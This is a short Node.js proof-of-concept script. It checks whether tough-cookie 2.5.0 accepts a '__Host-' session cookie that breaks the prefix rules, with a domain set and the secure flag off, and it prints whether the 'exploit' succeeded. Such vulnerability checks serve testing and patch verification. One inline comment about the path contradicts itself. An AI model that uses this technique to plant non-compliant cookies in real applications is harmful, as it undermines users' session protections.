'use strict';
const tough = require('tough-cookie');
const Cookie = tough.Cookie;
const CookieJar = tough.CookieJar;

const jar = new CookieJar();

// Trying to exploit the vulnerability in tough-cookie@2.5.0

const vulnerableCookie = new Cookie({
  key: '__Host-sessionId',
  value: 'abc123',
  domain: 'example.com',  // This should not be allowed for __Host- cookies
  path: '/',              // This should be /, but we want to trigger the vulnerability
  secure: false           // __Host- cookies must be Secure
});

jar.setCookie(vulnerableCookie, 'https://example.com', {}, (err) => {
  if (err) {
    console.log("EXPLOIT FAILED"); // The patched version should catch this and fail
  } else {
    console.log("EXPLOITED SUCCESSFULLY"); // The unpatched version should allow this
  }
});
